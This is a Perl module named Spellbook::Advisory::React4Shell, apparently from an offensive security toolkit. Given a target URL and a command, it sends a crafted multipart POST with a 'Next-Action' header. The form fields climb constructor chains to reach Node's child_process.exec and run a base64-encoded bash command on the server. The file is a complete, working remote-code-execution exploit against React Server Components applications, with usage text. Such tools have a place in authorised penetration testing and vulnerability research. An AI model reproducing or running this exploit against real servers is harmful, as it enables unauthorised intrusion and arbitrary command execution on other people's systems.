package Spellbook::Advisory::React4Shell {
    use strict;
    use warnings;
    use MIME::Base64;
    use Mojo::UserAgent;
    use Readonly;

    our $VERSION = '0.0.1';

    Readonly my $FORM_FIELD_3 => 3;
    Readonly my $FORM_FIELD_4 => 4;

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, $command, @result);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            'h|help'      => \$help,
            't|target=s'  => \$target,
            'c|command=s' => \$command
        );

        if ($target && $command) {
            my $useragent = Mojo::UserAgent -> new();
            my $encoded = 'echo ' . encode_base64($command, q{}) . ' | base64 -d | bash';

            ## no critic (ValuesAndExpressions::RequireInterpolationOfMetachars, ValuesAndExpressions::ProhibitInterpolationOfLiterals)
            my $response = $useragent -> post ($target => {
                'Next-Action'  => 'x',
                'Content-Type' => 'multipart/form-data'
            } => 'form' => {
                0 => q{"$1"},
                1 => qq~{"status":"resolved_model","reason":0,"_response":"\$4","value":"{\"then\":\"\$3:map\",\"0\":{\"then\":\"\$B3\"},\"length\":1}","then":"\$2:then"}~,
                2 => qq{"\$\@3"},
                $FORM_FIELD_3 => '[]',
                $FORM_FIELD_4 => qq^{"_prefix":"process.mainModule.require('child_process').exec('$encoded');//","_formData":{"get":"\$3:constructor:constructor"},"_chunks":"\$2:_response:_chunks"}^
            }) -> result -> body;
            ## use critic

            if (defined $response && length $response) {
                push @result, $response;
            }

            return @result;
        }

        if ($help) {
            return
                "\n"
              . "                \rAdvisory::React4Shell\n"
              . "                \r=====================\n"
              . "                \r-h, --help      See this menu\n"
              . "                \r-t, --target    Define a target URL\n"
              . "                \r-c, --command   Command to execute on the target\n\n\n";
        }

        return 0;
    }
}

1;
